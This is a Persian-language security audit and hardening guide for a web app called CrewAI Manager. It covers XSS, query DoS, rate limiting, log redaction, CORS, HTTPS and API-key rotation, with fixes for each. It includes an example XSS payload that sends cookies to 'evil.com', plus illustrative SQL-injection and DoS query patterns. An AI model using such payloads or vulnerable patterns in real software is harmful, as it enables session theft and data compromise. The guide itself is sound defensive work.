# راهنمای امنیتی - CrewAI Manager

این فایل مشکلات امنیتی شناسایی شده و راهکارهای رفع آن‌ها را شرح می‌دهد.

---

## 🔴 مشکلات امنیتی Critical

### 1. XSS (Cross-Site Scripting) در Export Service

**موقعیت:** `backend/app/services/export_service.py`

**خطوط:** 88, 106, 108

**توضیح:**
داده‌های ورودی بدون sanitize شدن مستقیماً در HTML قرار می‌گیرند.

**مثال حمله:**
```python
# اگر کاربر execution با این result ایجاد کند:
result = {
    "output": "<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>"
}

# و سپس آن را به HTML export کند:
# کد JavaScript اجرا می‌شود و cookie ها steal می‌شوند!
```

**راه حل:**
```python
import html
from markupsafe import escape

@staticmethod
def to_html(execution: Dict[str, Any]) -> str:
    """Export execution to HTML format with XSS protection."""
    # Sanitize all user inputs
    safe_id = html.escape(str(execution.get('id', 'N/A')))
    safe_status = html.escape(str(execution.get('status', 'N/A')))

    result = execution.get('result', '')
    if isinstance(result, dict):
        result = json.dumps(result, indent=2)
    safe_result = html.escape(str(result))

    # Limit size to prevent DoS
    if len(safe_result) > 50000:
        safe_result = safe_result[:50000] + "\n\n... (truncated for safety)"

    html_content = f"""<!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'none';">
        <title>Execution Report - {safe_id}</title>
        ...
    """

    return html_content
```

**اولویت:** 🔴 Critical - باید فوراً رفع شود

---

### 2. SQL Injection Risk در Memory Search

**موقعیت:** `backend/app/api/v1/memory.py`, `backend/app/services/mem0_service.py`

**خطوط:** 67, 119

**کد فعلی:**
```python
MemoryEntry.content.ilike(f"%{request.query}%")
```

**خطر:**
اگرچه SQLAlchemy از parameterized queries استفاده می‌کند، اما ILIKE با user input مستقیم می‌تواند منجر به DoS شود.

**مثال حمله:**
```python
# کاربر می‌تواند query بسیار بزرگ ارسال کند:
query = "%" * 10000  # باعث slow query می‌شود
```

**راه حل:**
```python
from sqlalchemy import func, or_
import re

def sanitize_search_query(query: str, max_length: int = 100) -> str:
    """Sanitize search query."""
    # حذف کاراکترهای خاص SQL
    query = re.sub(r'[%_\\]', '', query)

    # محدود کردن طول
    query = query[:max_length]

    # حذف فاصله‌های اضافی
    query = ' '.join(query.split())

    return query

# در API:
@router.post("/agents/{agent_id}/memory/search")
async def search_agent_memory(
    agent_id: UUID,
    request: MemorySearchRequest,
    db: Session = Depends(get_db),
):
    # Sanitize query
    safe_query = sanitize_search_query(request.query)

    if len(safe_query) < 2:
        raise HTTPException(400, "Query too short")

    # Use full-text search instead of ILIKE for better performance
    results = (
        db.query(MemoryEntry)
        .filter(
            MemoryEntry.agent_id == agent_id,
            func.to_tsvector('english', MemoryEntry.content).match(safe_query)
        )
        .limit(min(request.limit or 10, 100))  # Hard limit
        .all()
    )

    return MemorySearchResponse(results=results, total=len(results))
```

**اولویت:** ⚠️ High

---

### 3. Missing Rate Limiting

**مشکل:**
هیچ rate limiting روی API endpoints نیست. کاربر می‌تواند:
- 1000 request در ثانیه ارسال کند
- Database را overwhelm کند
- Export service را با درخواست‌های همزمان زیاد DoS کند

**راه حل:**
```python
# نصب dependency:
# pip install slowapi

from slowapi import Limiter, _rate_limit_exceeded_handler
from slowapi.util import get_remote_address
from slowapi.errors import RateLimitExceeded

# در main.py:
limiter = Limiter(key_func=get_remote_address)
app.state.limiter = limiter
app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)

# در endpoints:
@router.post("/agents/{agent_id}/memory/search")
@limiter.limit("10/minute")  # 10 requests per minute
async def search_agent_memory(
    request: Request,
    agent_id: UUID,
    search_request: MemorySearchRequest,
    db: Session = Depends(get_db),
):
    ...

@router.get("/executions/{id}/export")
@limiter.limit("5/minute")  # Export is expensive
async def export_execution(
    request: Request,
    id: UUID,
    format: str = "json",
    db: Session = Depends(get_db),
):
    ...
```

**اولویت:** 🔴 Critical

---

### 4. Unencrypted Sensitive Data in Logs

**مشکل:**
API keys و sensitive data ممکن است در logs ذخیره شوند.

**مثال:**
```python
logger.info(f"Executing with config: {config}")
# config ممکن است API key داشته باشد!
```

**راه حل:**
```python
import re

def sanitize_log_data(data: dict) -> dict:
    """Remove sensitive data from logs."""
    sensitive_keys = {'api_key', 'password', 'secret', 'token', 'authorization'}

    sanitized = {}
    for key, value in data.items():
        if any(sensitive in key.lower() for sensitive in sensitive_keys):
            sanitized[key] = "***REDACTED***"
        elif isinstance(value, dict):
            sanitized[key] = sanitize_log_data(value)
        else:
            sanitized[key] = value

    return sanitized

# استفاده:
logger.info(f"Config: {sanitize_log_data(config)}")
```

**اولویت:** ⚠️ Medium

---

### 5. Missing Input Validation

**مشکل:**
بسیاری از endpoints اعتبارسنجی کافی ندارند.

**مثال‌های خطرناک:**

```python
# ❌ عدم validation برای UUID:
@router.get("/agents/{agent_id}/memory")
async def get_agent_memory(agent_id: UUID, ...):
    # اگر agent_id invalid باشد چه؟
    # اگر agent متعلق به کاربر دیگری باشد چه؟
```

**راه حل:**
```python
from fastapi import HTTPException, Depends
from uuid import UUID

async def validate_agent_access(
    agent_id: UUID,
    db: Session = Depends(get_db),
    # current_user: User = Depends(get_current_user),  # بعداً اضافه شود
) -> Agent:
    """Validate agent exists and user has access."""
    agent = db.query(Agent).filter(Agent.id == agent_id).first()

    if not agent:
        raise HTTPException(404, "Agent not found")

    # TODO: بررسی دسترسی کاربر
    # if agent.user_id != current_user.id:
    #     raise HTTPException(403, "Access denied")

    return agent

@router.get("/agents/{agent_id}/memory")
async def get_agent_memory(
    agent: Agent = Depends(validate_agent_access),
    memory_type: Optional[str] = None,
    limit: int = 50,
    db: Session = Depends(get_db),
):
    # حالا مطمئنیم agent وجود دارد
    ...
```

**اولویت:** 🔴 Critical

---

## ⚠️ مشکلات امنیتی Medium

### 6. Weak CORS Configuration

**موقعیت:** `backend/app/main.py`

**کد فعلی:**
```python
origins = [
    "http://localhost:5173",
    "http://localhost:3000",
]

app.add_middleware(
    CORSMiddleware,
    allow_origins=origins,
    allow_credentials=True,
    allow_methods=["*"],  # ⚠️ خطرناک!
    allow_headers=["*"],  # ⚠️ خطرناک!
)
```

**مشکل:**
- `allow_methods=["*"]` همه HTTP methods را مجاز می‌کند
- `allow_headers=["*"]` همه headers را قبول می‌کند

**راه حل:**
```python
from fastapi.middleware.cors import CORSMiddleware

# در production:
if settings.ENVIRONMENT == "production":
    origins = [
        "https://yourdomain.com",
        "https://www.yourdomain.com",
    ]
else:
    origins = [
        "http://localhost:5173",
        "http://localhost:3000",
    ]

app.add_middleware(
    CORSMiddleware,
    allow_origins=origins,
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "DELETE", "PATCH"],  # مشخص
    allow_headers=[
        "Content-Type",
        "Authorization",
        "Accept",
        "Origin",
        "X-Requested-With",
    ],  # محدود
    max_age=3600,  # Cache preflight requests
)
```

---

### 7. Missing HTTPS Enforcement

**مشکل:**
هیچ اجباری برای HTTPS در production نیست.

**راه حل:**
```python
# backend/app/middleware/https_redirect.py
from starlette.middleware.httpsredirect import HTTPSRedirectMiddleware
from starlette.middleware.trustedhost import TrustedHostMiddleware

# در main.py:
if settings.ENVIRONMENT == "production":
    # Force HTTPS
    app.add_middleware(HTTPSRedirectMiddleware)

    # Allowed hosts
    app.add_middleware(
        TrustedHostMiddleware,
        allowed_hosts=["yourdomain.com", "*.yourdomain.com"]
    )

    # HSTS header
    @app.middleware("http")
    async def add_security_headers(request: Request, call_next):
        response = await call_next(request)
        response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
        response.headers["X-Content-Type-Options"] = "nosniff"
        response.headers["X-Frame-Options"] = "DENY"
        response.headers["X-XSS-Protection"] = "1; mode=block"
        return response
```

---

### 8. API Keys Stored Without Rotation

**مشکل:**
API keys یکبار encrypt می‌شوند ولی هیچ مکانیزم rotation ندارند.

**راه حل:**
```python
# اضافه کردن به LLMProvider model:
class LLMProvider(Base):
    # ...
    api_key_created_at = Column(DateTime, default=datetime.utcnow)
    api_key_expires_at = Column(DateTime, nullable=True)
    api_key_rotation_warning_sent = Column(Boolean, default=False)

    def is_api_key_expired(self) -> bool:
        """Check if API key has expired."""
        if not self.api_key_expires_at:
            return False
        return datetime.utcnow() > self.api_key_expires_at

    def needs_rotation_warning(self, days_before: int = 30) -> bool:
        """Check if rotation warning should be sent."""
        if not self.api_key_expires_at or self.api_key_rotation_warning_sent:
            return False

        days_until_expiry = (self.api_key_expires_at - datetime.utcnow()).days
        return days_until_expiry <= days_before

# Celery task برای بررسی روزانه:
@celery_app.task
def check_api_key_expiry():
    """Check and notify about expiring API keys."""
    db = SessionLocal()
    try:
        providers = db.query(LLMProvider).all()

        for provider in providers:
            if provider.needs_rotation_warning():
                # ارسال ایمیل یا notification
                send_rotation_warning(provider)
                provider.api_key_rotation_warning_sent = True

        db.commit()
    finally:
        db.close()
```

---

## 🛡️ Best Practices برای امنیت

### 1. Environment Variables

**هرگز این کارها را نکنید:**
```python
❌ SECRET_KEY = "my-secret-key-123"  # Hard-coded
❌ git add .env  # Commit کردن .env
❌ DEBUG = True  # در production
```

**همیشه:**
```python
✅ از environment variables استفاده کنید
✅ .env را در .gitignore قرار دهید
✅ از secrets manager در production استفاده کنید (AWS Secrets Manager, etc.)
✅ DEBUG=False در production
```

### 2. Password/Secret Generation

```bash
# برای SECRET_KEY:
python -c "import secrets; print(secrets.token_urlsafe(32))"

# برای ENCRYPTION_KEY (32 bytes):
python -c "from cryptography.fernet import Fernet; print(Fernet.generate_key().decode())"
```

### 3. Database Security

```python
# ✅ استفاده از prepared statements (SQLAlchemy این کار را می‌کند)
db.query(User).filter(User.email == email).first()

# ❌ هرگز raw SQL با f-string نسازید
db.execute(f"SELECT * FROM users WHERE email = '{email}'")  # SQL Injection!

# ✅ اگر نیاز به raw SQL دارید:
from sqlalchemy import text
db.execute(text("SELECT * FROM users WHERE email = :email"), {"email": email})
```

### 4. File Upload Security

اگر در آینده file upload اضافه شود:

```python
import magic
from pathlib import Path

ALLOWED_EXTENSIONS = {'.py', '.txt', '.json', '.md'}
MAX_FILE_SIZE = 5 * 1024 * 1024  # 5MB

def validate_file_upload(file: UploadFile) -> bool:
    """Validate uploaded file."""
    # بررسی extension
    file_ext = Path(file.filename).suffix.lower()
    if file_ext not in ALLOWED_EXTENSIONS:
        raise HTTPException(400, f"File type {file_ext} not allowed")

    # بررسی حجم
    file.file.seek(0, 2)  # به انتها برو
    file_size = file.file.tell()
    file.file.seek(0)  # برگرد به اول

    if file_size > MAX_FILE_SIZE:
        raise HTTPException(400, f"File too large (max {MAX_FILE_SIZE} bytes)")

    # بررسی MIME type واقعی (نه فقط extension!)
    mime = magic.from_buffer(file.file.read(1024), mime=True)
    file.file.seek(0)

    allowed_mimes = {'text/plain', 'text/x-python', 'application/json'}
    if mime not in allowed_mimes:
        raise HTTPException(400, f"MIME type {mime} not allowed")

    return True
```

---

## 🔒 Checklist امنیتی Production

قبل از deploy در production:

### Backend
- [ ] DEBUG=False
- [ ] SECRET_KEY تصادفی و قوی (32+ کاراکتر)
- [ ] ENCRYPTION_KEY تصادفی و قوی
- [ ] Database password قوی
- [ ] CORS به domain های مشخص محدود شده
- [ ] HTTPS اجباری شده
- [ ] Rate limiting فعال شده
- [ ] Input validation روی همه endpoints
- [ ] XSS protection در export
- [ ] SQL injection prevention بررسی شده
- [ ] Logs حاوی sensitive data نیستند
- [ ] Security headers اضافه شده

### Infrastructure
- [ ] Firewall فقط پورت‌های لازم را باز کرده
- [ ] Database از اینترنت قابل دسترسی نیست
- [ ] Redis با password محافظت شده
- [ ] SSL/TLS certificates معتبر نصب شده
- [ ] Automatic backups فعال شده
- [ ] Monitoring و alerting راه‌اندازی شده

### Application
- [ ] Dependencies به آخرین نسخه امن آپدیت شده
- [ ] `npm audit` و `pip-audit` اجرا شده
- [ ] Security tests نوشته شده
- [ ] Penetration testing انجام شده

---

## 📚 منابع مفید

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [FastAPI Security](https://fastapi.tiangolo.com/tutorial/security/)
- [Python Security Best Practices](https://python.readthedocs.io/en/stable/library/security_warnings.html)

---

**آخرین بروزرسانی:** 25 دسامبر 2024
**وضعیت:** Critical Issues Found 🔴
